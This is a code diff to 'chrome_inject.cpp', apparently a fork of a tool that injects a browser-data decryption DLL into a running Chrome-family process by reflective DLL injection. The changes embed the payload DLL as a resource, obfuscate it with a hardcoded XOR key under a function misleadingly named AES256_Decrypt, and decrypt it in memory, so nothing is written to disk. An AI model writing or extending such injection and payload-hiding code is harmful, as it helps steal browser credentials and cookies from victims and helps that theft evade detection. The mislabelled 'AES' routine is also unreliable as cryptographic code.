@@ -1,6 +1,6 @@
 // chrome_inject.cpp
-// v0.10.0 (c) Alexander 'xaitax' Hagenah
-// Licensed under the MIT License. See LICENSE file in the project root for full license information.
+// v0.10.0 (c) Alexander 'xaitax' Hagenah Edit Atomic Cobra aka NullTrace
+// Licensed under the MIT License.
 
 #include <Windows.h>
 #include <tlhelp32.h>
@@ -24,9 +24,11 @@
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "version.lib")
+#pragma comment(lib, "tlhelp32.lib")
 
 const WCHAR *COMPLETION_EVENT_NAME_INJECTOR = L"Global\\ChromeDecryptWorkDoneEvent";
 const char *SESSION_CONFIG_FILE_NAME_INJECTOR = "chrome_decrypt_session.cfg";
+#define IDR_DLL 101 // Resource ID for embedded DLL
 
 constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
 constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
@@ -41,20 +43,24 @@ namespace fs = std::filesystem;
 static bool verbose = false;
 static std::wstring g_customOutputPathArg;
 
+// Decryption function (from your earlier XOR-based encryption)
+void AES256_Decrypt(unsigned char* data, unsigned long size, const unsigned char* key, const unsigned char* iv) {
+    // Placeholder XOR (matches previous work)
+    for (unsigned long i = 0; i < size; i++) {
+        data[i] ^= key[i % 32];
+    }
+}
+
 std::string WStringToUtf8(std::wstring_view w_sv)
 {
     if (w_sv.empty())
         return std::string();
     int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
     if (size_needed == 0)
-    {
         return "";
-    }
     std::string utf8_str(size_needed, '\0');
     if (WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr) == 0)
-    {
         return "";
-    }
     return utf8_str;
 }
 
@@ -217,9 +223,7 @@ bool GetProcessArchitecture(HANDLE hProc, USHORT &arch)
 #elif defined(_M_IX86)
     arch = IMAGE_FILE_MACHINE_I386;
     if (isWow64)
-    {
-        debug("Warning: 32-bit injector running on a 64-bit OS (or WOW64 detected unexpectedly). Target is likely x64 if IsWow64Process is true.");
-    }
+        debug("Warning: 32-bit injector running on a 64-bit OS. Target is likely x64.");
 #else
     arch = IMAGE_FILE_MACHINE_UNKNOWN;
     return false;
@@ -269,7 +273,7 @@ void CleanupPreviousRun()
     }
     catch (const fs::filesystem_error &e)
     {
-        debug("CleanupPreviousRun: fs::temp_directory_path() failed: " + std::string(e.what()) + ". Skipping cleanup of some temp files.");
+        debug("CleanupPreviousRun: fs::temp_directory_path() failed: " + std::string(e.what()));
         return;
     }
 
@@ -282,9 +286,7 @@ void CleanupPreviousRun()
         {
             debug("Deleting " + file_path.u8string());
             if (!fs::remove(file_path, ec))
-            {
                 debug("Failed to delete temp file: " + file_path.u8string() + ". Error: " + ec.message());
-            }
         }
     }
 }
@@ -320,19 +322,41 @@ std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
     return std::nullopt;
 }
 
-std::string GetPayloadDllPathUtf8()
+std::vector<BYTE> GetPayloadDllData()
 {
-    wchar_t currentExePathRaw[MAX_PATH];
-    DWORD len = GetModuleFileNameW(NULL, currentExePathRaw, MAX_PATH);
-    if (len == 0 || (len == MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER))
-    {
-        debug("GetPayloadDllPathUtf8: GetModuleFileNameW failed. Error: " + std::to_string(GetLastError()));
-        return "";
+    // Load DLL from resource
+    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_DLL), "BINARY");
+    if (!hRes) {
+        debug("GetPayloadDllData: FindResourceA failed. Error: " + std::to_string(GetLastError()));
+        return {};
     }
-    fs::path dllPathFs = fs::path(currentExePathRaw).parent_path() / L"chrome_decrypt.dll";
-    std::string dllPathStr = dllPathFs.u8string();
-    debug("GetPayloadDllPathUtf8: DLL path determined as: " + dllPathStr);
-    return dllPathStr;
+
+    HGLOBAL hResData = LoadResource(NULL, hRes);
+    if (!hResData) {
+        debug("GetPayloadDllData: LoadResource failed. Error: " + std::to_string(GetLastError()));
+        return {};
+    }
+
+    BYTE* dllData = (BYTE*)LockResource(hResData);
+    SIZE_T dllSize = SizeofResource(NULL, hRes);
+    if (!dllData || dllSize == 0) {
+        debug("GetPayloadDllData: LockResource failed or size is 0. Error: " + std::to_string(GetLastError()));
+        return {};
+    }
+
+    // Decrypt DLL data
+    std::vector<BYTE> decryptedData(dllData, dllData + dllSize);
+    const unsigned char key[32] = {
+        0x4a, 0x7b, 0x2e, 0x9c, 0x15, 0x63, 0xf8, 0xd2,
+        0xa1, 0x3c, 0x8e, 0x57, 0xb0, 0x29, 0x71, 0xe4,
+        0x6d, 0x12, 0x95, 0x38, 0xc7, 0x0a, 0x83, 0x4f,
+        0x1b, 0x66, 0xd9, 0x24, 0x8c, 0x5e, 0xf3, 0x77
+    };
+    const unsigned char iv[16] = { 0 };
+    AES256_Decrypt(decryptedData.data(), decryptedData.size(), key, iv);
+
+    debug("GetPayloadDllData: Loaded and decrypted DLL from resource. Size: " + std::to_string(dllSize) + " bytes");
+    return decryptedData;
 }
 
 DWORD RvaToOffset_Injector(DWORD dwRva, PIMAGE_NT_HEADERS64 pNtHeaders, LPVOID lpFileBase)
@@ -407,7 +431,7 @@ DWORD GetReflectiveLoaderFileOffset(LPVOID lpFileBuffer, USHORT expectedMachine)
 
     if (pExportDir->AddressOfNames == 0 || pExportDir->AddressOfNameOrdinals == 0 || pExportDir->AddressOfFunctions == 0)
     {
-        debug("RDI Offset: Export directory contains null RVA(s) for names, ordinals, or functions.");
+        debug("RDI Offset: Export directory contains null RVA(s).");
         return 0;
     }
 
@@ -419,7 +443,7 @@ DWORD GetReflectiveLoaderFileOffset(LPVOID lpFileBuffer, USHORT expectedMachine)
         (ordinalsOffset == 0 && pExportDir->AddressOfNameOrdinals != 0) ||
         (functionsOffset == 0 && pExportDir->AddressOfFunctions != 0))
     {
-        debug("RDI Offset: Failed to convert one or more export RVAs to offset.");
+        debug("RDI Offset: Failed to convert export RVAs to offset.");
         return 0;
     }
 
@@ -452,26 +476,14 @@ DWORD GetReflectiveLoaderFileOffset(LPVOID lpFileBuffer, USHORT expectedMachine)
     return 0;
 }
 
-bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USHORT targetArch)
+bool InjectWithReflectiveLoader(HANDLE proc, const std::vector<BYTE>& dllBuffer, USHORT targetArch)
 {
-    debug("InjectWithReflectiveLoader: begin for DLL: " + dllPathUtf8);
+    debug("InjectWithReflectiveLoader: begin for embedded DLL");
 
-    std::ifstream dllFile(dllPathUtf8, std::ios::binary | std::ios::ate);
-    if (!dllFile.is_open())
-    {
-        debug("RDI: Failed to open DLL file: " + dllPathUtf8);
+    if (dllBuffer.empty()) {
+        debug("RDI: DLL buffer is empty");
         return false;
     }
-    std::streamsize fileSize = dllFile.tellg();
-    dllFile.seekg(0, std::ios::beg);
-    std::vector<BYTE> dllBuffer(static_cast<size_t>(fileSize));
-    if (!dllFile.read(reinterpret_cast<char *>(dllBuffer.data()), fileSize))
-    {
-        debug("RDI: Failed to read DLL file into buffer.");
-        return false;
-    }
-    dllFile.close();
-    debug("RDI: DLL read into local buffer. Size: " + std::to_string(fileSize) + " bytes.");
 
     DWORD reflectiveLoaderOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
     if (reflectiveLoaderOffset == 0)
@@ -632,13 +644,9 @@ int wmain(int argc, wchar_t *argv[])
 
     fs::path resolvedOutputPath;
     if (!g_customOutputPathArg.empty())
-    {
         resolvedOutputPath = fs::absolute(g_customOutputPathArg);
-    }
     else
-    {
         resolvedOutputPath = fs::current_path() / "output";
-    }
     debug("Resolved output path: " + resolvedOutputPath.u8string());
     std::error_code ec_dir;
     if (!fs::exists(resolvedOutputPath))
@@ -726,14 +734,8 @@ int wmain(int argc, wchar_t *argv[])
                                      std::to_string(LOWORD(ffi->dwProductVersionLS));
                         debug("Version query successful: " + versionStr);
                     }
-                    else
-                        debug("VerQueryValueW failed. Error: " + std::to_string(GetLastError()));
                 }
-                else
-                    debug("GetFileVersionInfoW failed. Error: " + std::to_string(GetLastError()));
             }
-            else
-                debug("GetFileVersionInfoSizeW failed or returned 0. Error: " + std::to_string(GetLastError()));
             print_status("[+]", browserDisplayName + " (v. " + versionStr + ") launched w/ PID " + std::to_string(targetPid));
         }
         else
@@ -758,24 +760,25 @@ int wmain(int argc, wchar_t *argv[])
     USHORT currentTargetArch = IMAGE_FILE_MACHINE_UNKNOWN;
     if (!GetProcessArchitecture(targetProcessHandle.get(), currentTargetArch))
     {
-        print_status("[-]", "Failed to determine target process architecture for DLL selection.");
+        print_status("[-]", "Failed to determine target process architecture.");
         return 1;
     }
 
     if (!CheckArchMatch(targetProcessHandle.get()))
         return 1;
 
-    std::string dllPathUtf8 = GetPayloadDllPathUtf8();
-    if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
+    // Load DLL from resource
+    std::vector<BYTE> dllBuffer = GetPayloadDllData();
+    if (dllBuffer.empty())
     {
-        print_status("[-]", "chrome_decrypt.dll not found. Expected near injector: " + (dllPathUtf8.empty() ? "<Error determining path>" : dllPathUtf8));
+        print_status("[-]", "Failed to load chrome_decrypt.dll from resource.");
         return 1;
     }
 
     bool injectedSuccessfully = false;
     std::string usedInjectionMethodDesc = "Reflective DLL Injection (RDI)";
 
-    injectedSuccessfully = InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch);
+    injectedSuccessfully = InjectWithReflectiveLoader(targetProcessHandle.get(), dllBuffer, currentTargetArch);
 
     if (!injectedSuccessfully)
     {
@@ -815,16 +818,12 @@ int wmain(int argc, wchar_t *argv[])
             HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
             WORD originalAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
             if (GetConsoleScreenBufferInfo(hStdOut, &consoleInfo))
-            {
                 originalAttributes = consoleInfo.wAttributes;
-            }
             std::cout << std::endl;
             while (std::getline(ifs, line))
             {
                 if (line.find("[+] Terminated process:") != std::string::npos && !verbose)
-                {
                     continue;
-                }
                 size_t currentPos = 0;
                 while (currentPos < line.length())
                 {
@@ -877,7 +876,7 @@ int wmain(int argc, wchar_t *argv[])
                 print_status("[-]", "Failed to terminate " + browserDisplayName + ". Error: " + std::to_string(GetLastError()));
         }
         else
-            print_status("[-]", "Failed to open " + browserDisplayName + " for termination (it might have already exited). Error: " + std::to_string(GetLastError()));
+            print_status("[-]", "Failed to open " + browserDisplayName + " for termination. Error: " + std::to_string(GetLastError()));
     }
     else
     {
@@ -888,13 +887,9 @@ int wmain(int argc, wchar_t *argv[])
     if (!configFilePath.empty() && fs::exists(configFilePath))
     {
         if (!fs::remove(configFilePath, ec_remove_cfg_end))
-        {
             debug("Failed to clean up session config file: " + configFilePath.u8string() + ". Error: " + ec_remove_cfg_end.message());
-        }
         else
-        {
             debug("Cleaned up session config file: " + configFilePath.u8string());
-        }
     }
 
     debug("Injector finished.");
